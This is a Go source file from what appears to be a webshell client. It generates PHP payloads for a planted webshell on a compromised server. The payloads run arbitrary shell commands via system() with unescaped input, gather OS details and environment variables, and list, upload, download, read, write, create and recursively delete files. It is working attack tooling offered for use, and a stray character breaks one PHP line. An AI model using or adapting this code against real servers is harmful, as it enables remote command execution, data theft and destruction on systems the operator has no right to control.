package php

import (
	"caffeine/core"
	"fmt"
)

// php 传递code 执行
// 系统信息
type PHPWebshell struct {
}

func (p *PHPWebshell) CheckOnline() []byte {
	code := "echo 'hello'; "
	return []byte(code)
}

func (p *PHPWebshell) GetOsInfo() []byte {
	code := ` 
function getSystemEnvVars() {
    $envVars = array();
    $envVars["PATH"] = getenv("PATH");
    $envVars["HOME"] = getenv("HOME");
    $envVars["USER"] = getenv("USER");
    $envVars["TEMP"] = getenv("TEMP");
    if (isset($_ENV) && is_array($_ENV)) {
        foreach ($_ENV as $key => $value) {
            $envVars[$key] = $value;
        }
    }
    return $envVars;
}
$data=array(
    "fileRoot"=> realpath("/"),
    "currentDir"=>getcwd(),
    "currentUser"=>get_current_user(),
    "processArch"=>(PHP_INT_SIZE * 8),
    "tempDirectory"=>sys_get_temp_dir(),
    "ipList"=>gethostbynamel(gethostname()),
    "env"=>getSystemEnvVars(),
    "os"=>array(
        "name"=>php_uname("s"),
        "version"=> php_uname("v"),
        "arch"=>php_uname("m"),
    )
);
$jsonData = json_encode($data);
echo $jsonData;  `
	return []byte(code)
}

// $path = "%s";
// if (realpath($path) !== false && strpos(realpath($path), $path) === 0) {
// $escaped_command = escapeshellarg("cd %s&& %s");
// $output = shell_exec($escaped_command);
// } else {
// echo "error";
// }
func (p *PHPWebshell) RunCmd(path string, cmd string) []byte {
	code := fmt.Sprintf(`
ob_start();
system("cd %s && %s");
$output = ob_get_clean();
if(!preg_match('//u', $output)){
	$output = iconv('GB2312', 'UTF-8//IGNORE', $output);
}
echo nl2br($output);
`, path, cmd)
	return []byte(code)
}

// 加载目录,返回json数据
func (p *PHPWebshell) LoadDir(path string) []byte {
	code := fmt.Sprintf(`

$dirPath = '%s';
$directory = array(
    "name" => basename($dirPath),
    "sub" => array(),
    "files" => array(),
    "path" => $dirPath
);
if ($handle = opendir($dirPath)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != "..") {
            $entryPath = $dirPath . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($entryPath)) {
                $directory['sub'][] = array(
                    "name" => $entry,
                    "path" => $entryPath
                );
            } else {
                $fileInfo = stat($entryPath);
                $fileSize = $fileInfo['size']; 
               $lastModified = date("Y-m-d\TH:i:s\Z", $fileInfo['mtime']);
                $permissions = fileperms($entryPath);
                
                $directory['files'][] = array(
                    "name" => $entry,
                    "size" => $fileSize,
                    "lastModified" => $lastModified,
                    "permissions" => $permissions
                );
            }
        }
    }
closedir($handle);}
echo json_encode($directory);  `, path)
	return []byte(code)
}

// 上传文件
func (p *PHPWebshell) Upload(path string, fileData string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
file_put_contents($path, %s);`, path, string(fileData))
	return []byte(code)
}

// 下载文件
func (p *PHPWebshell) Download(path string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
if (file_exists($path)) {
    echo file_get_contents($path);
} else {
    echo "File not found.";
}`, path)
	return []byte(code)

}

// 读取文件
func (p *PHPWebshell) ReadFile(file *core.FileInfo) []byte {
	code := fmt.Sprintf(`
try {
    if (!file_exists("%s")) {
        throw new Exception("Error://[File does not exist.]");
    }
    $content = file_get_contents("%s");
    if ($content === false) {
        throw new Exception("Error://[Unable to read file.]");
    }
    echo nl2br($content);
} catch (Exception $e) {
    echo "Error://[".$e->getMessage()."]";
}`, file.FilePath, file.FilePath)
	return []byte(code)
}

// 写文件
func (p *PHPWebshell) WriteFile(file *core.FileInfo, content string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
file_put_contents($path, "%s");`, file.FilePath, content)
	return []byte(code)
}

func (p *PHPWebshell) Delete(path string) []byte {
	code := fmt.Sprintf(`$path = "%s";
try {
    if (!file_exists($path)) {
        throw new Exception("路径不存在: $path");
    }
    if (is_file($path)) {
        if (unlink($path)) {
            echo "ok";
        } else {
            throw new Exception("无法删除文件: $path");
        }
    }
    elseif (is_dir($path)) {录
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file) {
            $filePath = $path . DIRECTORY_SEPARATOR . $file;
            if (is_dir($filePath)) {
                $subFiles = array_diff(scandir($filePath), array('.', '..'));
                foreach ($subFiles as $subFile) {
                    $subFilePath = $filePath . DIRECTORY_SEPARATOR . $subFile;
                    if (!unlink($subFilePath) && !rmdir($subFilePath)) {
                        throw new Exception("无法删除文件或目录: $subFilePath");
                    }
                }
                rmdir($filePath); 
            } else {
                if (!unlink($filePath)) {
                    throw new Exception("无法删除文件: $filePath");
                }
            }
        }
        if (rmdir($path)) {
            echo "目录及其内容已删除: $path\n";
        } else {
            throw new Exception("无法删除目录: $path");
        }
    } else {
        throw new Exception("路径不是文件也不是目录: $path");
    }
} catch (Exception $e) {
    echo "Error://[" . $e->getMessage() . "]";
}`, path)
	return []byte(code)
}

// 创建目录
func (p *PHPWebshell) MakeDir(dirName string) []byte {
	code := fmt.Sprintf(`
$directoryPath = "%s";
if (!is_dir($directoryPath)) {
    if (mkdir($directoryPath, 0777)) {
        echo "ok";
    } else {
        echo "Error://[Failed to create directory: " . $directoryPath . "]\n";
    }
} else {
    echo "Error://[Directory already exists: " . $directoryPath ."]";
}`, dirName)
	return []byte(code)
}

// 创建文件
func (p *PHPWebshell) MakeFile(filepath string) []byte {
	code := fmt.Sprintf(`
$filePath = "%s";
$directoryPath = dirname($filePath);
if (!is_dir($directoryPath)) {
    if (!mkdir($directoryPath, 0777, true)) {
        echo "Error://[Failed to create directory: " . $directoryPath . "]";
    }
}
if (touch($filePath)) {
    echo "ok";
} else {
    echo "Error://[Failed to create empty file: " . $filePath . "]\n";
}
`, filepath)
	return []byte(code)
}

func NewPHPWebShell() *PHPWebshell {
	return &PHPWebshell{}
}
